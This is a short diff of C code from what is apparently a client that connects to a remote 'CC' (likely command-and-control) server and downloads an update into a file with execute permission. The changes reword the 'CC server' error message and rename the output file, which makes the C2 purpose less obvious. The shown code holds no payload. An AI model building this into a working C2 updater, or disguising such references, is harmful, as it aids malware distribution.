@@ -28,7 +28,7 @@ int connect_cc(char *ip_adrr, int port, int *socket_desc,
 	server->sin_family = AF_INET;
 	server->sin_port = htons(port);
 
-	if (connect(*socket_desc, (struct sockaddr *)&((*server)),
+	if (connect(*socket_desc, (struct sockaddr *)&(*server),
 		    sizeof(*server)) < 0) {
 		printf("Error connecting\n");
 		return ERROR;
@@ -46,11 +46,11 @@ int download_update(char *ip_addr, int port)
 	int f = 0;
 
 	if (connect_cc(ip_addr, port, &socket_desc, &server) == ERROR) {
-		printf("Error connecting to CC server\n");
+		printf("Error connecting to the server\n");
 		return ERROR;
 	}
 
-	f = open("NEW", O_RDWR | O_CREAT | O_APPEND, S_IRWXU);
+	f = open("tmp_file", O_RDWR | O_CREAT | O_APPEND, S_IRWXU);
 	if (f == ERROR) {
 		printf("Error opening file\n");
 		return ERROR;
